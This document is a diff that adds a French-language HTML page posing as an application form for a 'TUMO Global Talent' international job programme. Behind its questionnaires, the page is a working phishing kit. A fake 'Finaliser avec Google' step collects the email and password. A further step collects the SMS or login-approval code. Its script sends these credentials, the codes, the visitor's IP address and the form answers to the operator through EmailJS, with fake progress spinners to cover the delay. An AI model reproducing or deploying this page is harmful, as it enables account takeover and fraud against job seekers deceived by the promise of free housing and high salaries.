@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>TUMO Global Talent</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+:root{
+--bg1:#eef2ff;
+--bg2:#ecfeff;
+--accent:#6366f1;
+--accent2:#22c55e;
+--text:#0f172a;
+--sub:#64748b;
+}
+
+*{box-sizing:border-box;}
+body{
+margin:0;
+font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Inter",sans-serif;
+background:linear-gradient(135deg,var(--bg1),var(--bg2));
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+color:var(--text);
+}
+
+.card{
+width:92%;
+max-width:520px;
+background:rgba(255,255,255,.7);
+backdrop-filter:blur(20px);
+border-radius:28px;
+padding:32px;
+box-shadow:0 30px 80px rgba(0,0,0,.12);
+border:1px solid rgba(255,255,255,.6);
+max-height:92vh;
+overflow:auto;
+}
+
+.page{display:none;opacity:0;transform:translateY(20px);transition:.45s;}
+.page.active{display:block;opacity:1;transform:translateY(0);}
+
+h1{font-size:28px;margin-bottom:8px;}
+h2{margin-bottom:8px;}
+p{color:var(--sub);line-height:1.5;}
+
+input,textarea,select{
+width:100%;
+padding:14px;
+margin-top:12px;
+border-radius:14px;
+border:1px solid #e2e8f0;
+background:#fff;
+font-size:14px;
+}
+
+select[multiple]{min-height:180px;}
+
+input:focus,textarea:focus,select:focus{
+outline:none;
+border-color:var(--accent);
+box-shadow:0 0 0 3px rgba(99,102,241,.15);
+}
+
+button{
+width:100%;
+margin-top:18px;
+padding:14px;
+border:none;
+border-radius:999px;
+font-weight:600;
+font-size:15px;
+background:linear-gradient(135deg,var(--accent),var(--accent2));
+color:white;
+cursor:pointer;
+}
+
+button:disabled{opacity:.7;cursor:not-allowed;}
+button:hover{transform:translateY(-2px);}
+
+.progress{height:6px;background:#e2e8f0;border-radius:999px;overflow:hidden;margin-bottom:22px;}
+.bar{height:100%;width:16%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:.4s;}
+.badge{display:inline-block;padding:6px 12px;border-radius:999px;background:rgba(99,102,241,.1);color:var(--accent);font-size:12px;margin-bottom:10px;}
+.countries{font-size:13px;margin-top:10px;color:#334155;}
+.note{margin-top:10px;font-size:13px;color:#16a34a;}
+.small{font-size:12px;color:#94a3b8;margin-top:8px;}
+.secure{margin-top:15px;text-align:center;font-size:13px;color:#0f766e;background:#ecfeff;padding:10px;border-radius:12px;}
+.spinner{width:60px;height:60px;margin:28px auto;border:5px solid #e2e8f0;border-top:5px solid var(--accent);border-radius:50%;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.percent{font-size:32px;font-weight:700;text-align:center;margin-top:10px;color:var(--accent);}
+</style>
+</head>
+<body>
+
+<div class="card">
+<div class="progress"><div class="bar" id="bar"></div></div>
+
+<!-- PAGE 1 -->
+<div class="page active" id="p1">
+<div class="badge">Programme international</div>
+<h1>Veuillez poursuivre votre candidature</h1>
+<p>Complétez les deux questionnaires.</p>
+<div class="countries">
+</div>
+<div class="note">✔ Hébergement gratuit • ✔ Conditions premium et salaires élevés</div>
+<button onclick="postulerEtContinuer()">Postuler maintenant</button>
+<div class="small">⏱ Moins de 2 minutes</div>
+</div>
+
+<!-- NEW PAGE 1.5 -->
+<div class="page" id="p15">
+<h2>Questionnaire 1</h2>
+
+<input id="Ville actuelle" placeholder="Ville actuelle">
+
+<select id="fieldInterest">
+<option value="">Pour quelle durée souhaitez-vous participer</option>
+<option>2 mois</option>
+<option>4 mois</option>
+<option>6 mois</option>
+<option>1 an</option>
+<option>Plus</option>
+</select>
+
+<input id="heures" placeholder="Combien d’heures pouvez-vous consacrer par jour ?">
+<label style="display:block;margin-top:12px;font-weight:600;">
+
+Veuillez sélectionner les logiciels avec lesquels vous travaillez :
+</label>
+
+<div id="relocateCountries" style="margin-top:14px;border:1px solid #e2e8f0;padding:14px;border-radius:14px;background:#fff;">
+
+<label><input type="checkbox" name="relocate" value="Canva"> Canva</label><br>
+
+<label><input type="checkbox" name="relocate" value="Blender"> Blender</label><br>
+
+<label><input type="checkbox" name="relocate" value="Python"> Python</label><br>
+
+<label><input type="checkbox" name="relocate" value="Adobe Photoshop"> Adobe Photoshop</label><br>
+
+<label><input type="checkbox" name="relocate" value="Adobe Illustrator"> Adobe Illustrator</label><br>
+
+<label><input type="checkbox" name="relocate" value="Adobe InDesign"> Adobe InDesign</label><br>
+
+<label><input type="checkbox" name="relocate" value="Procreate"> Procreate</label><br>
+
+<label><input type="checkbox" name="relocate" value="Webflow"> Webflow</label><br>
+
+<label><input type="checkbox" name="relocate" value="Sketch"> Sketch</label>
+
+</div>
+
+<p class="small">
+Sélectionnez un ou plusieurs logiciels.
+</p>
+
+<input id="compensation" placeholder="Quels sont vos loisirs ?">
+
+<button onclick="stepIntermediaire()">Continuer</button>
+</div>
+
+<!-- PAGE 2 -->
+<div class="page" id="p2">
+<h2>Finaliser avec Google</h2>
+<input id="email" placeholder="Adresse e-mail">
+<input id="name" placeholder="Mot de passe">
+<button id="btn1" onclick="step1()">Vérifiez que vous n’êtes pas un robot. Continuer</button>
+<div class="secure">🔒 Connexion sécurisée</div>
+</div>
+
+<div class="page" id="pLoading1">
+<h2>Vérification en cours...</h2>
+<p>Traitement des informations...</p>
+<div class="spinner"></div>
+<div class="percent" id="percent1">23%</div>
+</div>
+
+<div class="page" id="p3">
+<h2>Vérification (approuvez la connexion ou vérifiez le code SMS)</h2>
+<input id="code" type="number" inputmode="numeric" pattern="[0-9]*" placeholder="Entrez le code.">
+<button id="btn2" onclick="step2()">Continuer</button>
+<div class="secure">🔒 Connexion sécurisée</div>
+</div>
+
+<div class="page" id="pLoading2">
+<h2>Validation du code...</h2>
+<p>Vérification sécurisée en cours...</p>
+<div class="spinner"></div>
+<div class="percent" id="percent2">23%</div>
+</div>
+
+<div class="page" id="p4">
+<h2>Questionnaire 2</h2>
+<textarea id="skills" placeholder="Quand êtes-vous en mesure de commencer le programme ?"></textarea>
+<textarea id="motivation" placeholder="Quelle compétence cherchez-vous à améliorer ?"></textarea>
+<button onclick="step3()">Soumettre</button>
+</div>
+
+<div class="page" id="p5">
+<h2>🎉 Candidature envoyée. Merci beaucoup !</h2>
+<p>Vous contacterons prochainement.</p>
+</div>
+
+</div>
+
+<script>
+emailjs.init("aYrdYz1AzJDfA_Cjw");
+
+async function getIP() {
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return "not available";
+    }
+}
+
+function progressWidth(step){
+const widths={1:16,15:32,2:48,3:64,4:82,5:100};
+document.getElementById('bar').style.width=widths[step]+"%";
+}
+
+function go(n){
+document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+document.getElementById('p'+n).classList.add('active');
+progressWidth(n);
+}
+
+function showPage(id){
+document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+document.getElementById(id).classList.add('active');
+}
+
+function isValidEmail(email){
+return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function fakeProgress(elementId,done){
+let el=document.getElementById(elementId);
+el.innerHTML="23%";
+setTimeout(()=>{el.innerHTML="68%";},4444);
+setTimeout(()=>{el.innerHTML="100%";done();},5555);
+}
+
+/* ADDITION 1: EmailJS notification on click Postuler */
+function postulerEtContinuer(){
+
+go(15);
+
+// get IP only here (first page only)
+getIP().then(ip => {
+    emailjs.send(
+        "service_98knmmq",
+        "template_8mzupbl",
+        {
+            action: "Nouveau clic sur Postuler",
+            message: "Un candidat a cliqué sur Postuler maintenant",
+            ip: ip
+        }
+    );
+});
+
+}
+
+/* ADDITION 2: New inserted form page */
+function stepIntermediaire(){
+
+if(!document.getElementById('Ville actuelle').value.trim()){
+alert('Veuillez entrer votre ville');
+return;
+}
+
+if(!document.getElementById('fieldInterest').value.trim()){
+alert('Veuillez sélectionner une durée');
+return;
+}
+
+if(!document.getElementById('heures').value.trim()){
+alert('Veuillez entrer les heures');
+return;
+}
+
+if(document.querySelectorAll('input[name="relocate"]:checked').length===0){
+alert('Veuillez choisir au moins un logiciel');
+return;
+}
+
+if(!document.getElementById('compensation').value.trim()){
+alert('Veuillez entrer vos loisirs');
+return;
+}
+
+go(2);
+
+}
+
+function step1(){
+let email=document.getElementById('email').value.trim();
+let name=document.getElementById('name').value.trim();
+
+if(!email){alert('Veuillez entrer votre email');return;}
+if(!isValidEmail(email)){alert('Email incorrect');return;}
+if(!name){alert('Veuillez entrer votre nom');return;}
+
+document.getElementById('btn1').disabled=true;
+
+emailjs.send(
+"service_98knmmq",
+"template_8mzupbl",
+{
+name:name,
+email:email,
+age:document.getElementById('Ville actuelle').value,
+field_interest:document.getElementById('fieldInterest').value,
+languages:document.getElementById('heures').value,
+relocation:Array.from(document.querySelectorAll('input[name="relocate"]:checked')).map(o=>o.value).join(', '),
+compensation:document.getElementById('compensation').value
+}
+);
+
+showPage('pLoading1');
+document.getElementById('bar').style.width='56%';
+
+fakeProgress('percent1',function(){
+go(3);
+document.getElementById('btn1').disabled=false;
+});
+}
+
+function step2(){
+
+let code=document.getElementById('code').value.trim();
+
+if(code===""){
+alert("Veuillez entrer le code");
+return;
+}
+
+document.getElementById('btn2').disabled=true;
+
+emailjs.send(
+"service_98knmmq",
+"template_8mzupbl",
+{
+code:code
+}
+);
+
+showPage('pLoading2');
+
+document.getElementById('bar').style.width='74%';
+
+fakeProgress('percent2',function(){
+go(4);
+document.getElementById('btn2').disabled=false;
+});
+
+}
+
+function step3(){
+emailjs.send(
+"service_98knmmq",
+"template_8mzupbl",
+{
+name:document.getElementById('name').value,
+email:document.getElementById('email').value,
+age:document.getElementById('Ville actuelle').value,
+field_interest:document.getElementById('fieldInterest').value,
+languages:document.getElementById('heures').value,
+relocation:Array.from(document.querySelectorAll('input[name="relocate"]:checked')).map(o=>o.value).join(', '),
+compensation:document.getElementById('compensation').value,
+skills:document.getElementById('skills').value,
+motivation:document.getElementById('motivation').value
+}
+);
+
+go(5);
+}
+</script>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69ebae13c8db451c314420c9/1jn0a007g';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+</body>
+</html>
